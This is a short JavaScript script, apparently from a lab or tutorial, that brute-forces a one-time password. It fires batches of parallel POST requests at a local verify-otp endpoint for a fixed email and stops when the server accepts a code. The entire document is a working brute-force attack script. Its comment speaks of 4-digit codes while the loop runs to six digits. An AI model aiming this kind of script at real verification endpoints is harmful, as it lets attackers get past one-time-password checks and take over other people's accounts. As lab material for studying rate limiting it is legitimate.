import axios from "axios";

const main = async () => {
  for (let i = 0; i < 999999; i += 100) { // Testing all possible 4-digit OTPs
    const promises = [];
    for(let j = 0; j < 100; j++) {
      promises.push(sendRequest(i+j));
    }
    await Promise.all(promises);
  }
};

async function sendRequest(otp) {
    const response = await axios.post(
      "http://localhost:3000/verify-otp",
      {
        email: "rahul@gmail.com",
        otp: `${otp}`,
      },
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    );

    if (response.data.success) {
      console.log(`Real OTP is ${otp}`);
      process.exit(0); // Stop the script when OTP is found
    } else {
      console.log(`OTP ${otp} is incorrect`);
    }
 
}

main();
